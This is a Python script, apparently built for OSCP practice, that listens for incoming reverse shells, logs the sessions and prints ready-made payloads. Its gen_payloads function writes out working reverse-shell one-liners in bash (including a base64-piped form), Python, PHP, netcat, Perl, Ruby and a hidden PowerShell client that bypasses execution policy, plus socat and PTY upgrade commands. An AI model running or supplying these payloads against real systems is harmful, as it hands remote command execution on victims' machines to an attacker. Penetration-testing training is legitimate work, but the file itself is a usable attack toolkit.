```python
#!/usr/bin/env python3
"""
shell_handler.py - Reverse shell listener with TTY upgrade
Usage: python3 shell_handler.py -p 4444 --log logs/
"""

import argparse
import socket
import sys
import os
import threading
import datetime
import select
import termios
import tty

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
B = '\033[1m'
X = '\033[0m'

def info(s): print(f"{C}[*]{X} {s}")
def good(s): print(f"{G}[+]{X} {s}")
def warn(s): print(f"{Y}[!]{X} {s}")
def bad(s): print(f"{R}[-]{X} {s}")

def gen_payloads(ip, port):
    p = port
    return {
        "bash": f"bash -i >& /dev/tcp/{ip}/{p} 0>&1",
        "bash_b64": f"echo 'bash -i >& /dev/tcp/{ip}/{p} 0>&1' | base64 -d | bash",
        "bash_196": f"0<&196;exec 196<>/dev/tcp/{ip}/{p}; sh <&196 >&196 2>&196",
        "python2": f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "php": f"php -r '$s=fsockopen(\"{ip}\",{p});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "nc": f"nc -e /bin/sh {ip} {p}",
        "nc_noe": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {p} >/tmp/f",
        "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        "ruby": f"ruby -rsocket -e 'f=TCPSocket.open(\"{ip}\",{p}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{p});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    }

TTY_UPGRADE_CMDS = """
TTY Upgrade Commands:

Option 1 - Python PTY (most reliable)
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm
stty rows 50 columns 200

Option 2 - Script
script /dev/null -c bash
Ctrl+Z -> stty raw -echo; fg -> export TERM=xterm

Option 3 - Socat (full PTY)
Attacker: socat file:`tty`,raw,echo=0 tcp-listen:POPRT
Target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:PORT
"""

class SessionLogger:
    def __init__(self, log_dir, target_ip):
        os.makedirs(log_dir, exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = os.path.join(log_dir, f"session_{target_ip}_{ts}.log")
        self.f = open(fname, "wb")
        self.path = fname
        good(f"Logging session to: {fname}")

    def write(self, data):
        self.f.write(data)
        self.f.flush()

    def close(self):
        self.f.close()

def interactive_shell(conn, log_dir=None, target_ip="unknown"):
    logger = SessionLogger(log_dir, target_ip) if log_dir else None

    print(f"\n{Y}{TTY_UPGRADE_CMDS}{X}\n")
    good("Shell connected. Ctrl+C to exit.\n")

    old_settings = None
    try:
        old_settings = termios.tcgetattr(sys.stdin)
        tty.setraw(sys.stdin.fileno())
    except Exception:
        pass

    conn.setblocking(False)

    try:
        while True:
            rlist, _, _ = select.select([conn, sys.stdin], [], [], 0.1)
            for r in rlist:
                if r is conn:
                    try:
                        data = conn.recv(4096)
                        if not data:
                            good("Connection closed by remote")
                            return
                        sys.stdout.buffer.write(data)
                        sys.stdout.flush()
                        if logger:
                            logger.write(data)
                    except Exception:
                        return
                elif r is sys.stdin:
                    data = sys.stdin.buffer.read(1)
                    if data:
                        conn.send(data)
                        if logger:
                            logger.write(b"[INPUT] " + data)
    except KeyboardInterrupt:
        good("Exiting shell handler")
    finally:
        if old_settings:
            try:
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
            except Exception:
                pass
        if logger:
            logger.close()
        conn.close()

def start_listener(port, log_dir=None, multi=False):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", port))
        srv.listen(5)
        good(f"Listening on 0.0.0.0:{port}")
        info("Waiting for connection...")

        while True:
            try:
                conn, addr = srv.accept()
                good(f"Connection from {addr[0]}:{addr[1]}")
                if multi:
                    t = threading.Thread(target=interactive_shell, args=(conn, log_dir, addr[0]), daemon=True)
                    t.start()
                else:
                    interactive_shell(conn, log_dir, addr[0])
                    if not multi:
                        break
            except KeyboardInterrupt:
                bad("Listener stopped")
                break
    except OSError as e:
        bad(f"Could not bind to port {port}: {e}")
    finally:
        srv.close()

def main():
    ap = argparse.ArgumentParser(description="shell_handler.py — OSCP reverse shell manager")
    ap.add_argument("-p", "--port", type=int, default=None)
    ap.add_argument("-i", "--ip", default=None, help="Your IP (for payload gen)")
    ap.add_argument("--log", default=None, help="Session log directory")
    ap.add_argument("--multi", action="store_true", help="Accept multiple connections")
    ap.add_argument("--gen-payload", action="store_true", help="Print payloads for IP:PORT")
    ap.add_argument("--type", default=None, help="Payload type (bash/php/python3/etc)")
    ap.add_argument("--list-types", action="store_true", help="List all payload types")
    args = ap.parse_args()

    if args.list_types or (args.gen_payload and not args.ip):
        ip = args.ip or "YOUR_IP"
        port = args.port or 4444
        payloads = gen_payloads(ip, port)
        print(f"\n{B}Available payload types:{X}")
        for name in payloads:
            print(f"  {name}")
        sys.exit(0)

    if args.gen_payload:
        if not args.port:
            bad("Specify --port")
            sys.exit(1)
        payloads = gen_payloads(args.ip, args.port)
        if args.type:
            types = [t.strip() for t in args.type.split(",")]
        else:
            types = list(payloads.keys())

        print(f"\n{B}{C}Reverse Shell Payloads — {args.ip}:{args.port}{X}\n")
        for t in types:
            if t in payloads and payloads[t]:
                print(f"{B}{Y}--- {t} ---{X}")
                print(f"  {payloads[t]}\n")
        print(TTY_UPGRADE_CMDS)
        sys.exit(0)

    if not args.port:
        ap.print_help()
        sys.exit(1)

    start_listener(args.port, log_dir=args.log, multi=args.multi)

if __name__ == "__main__":
    main()
```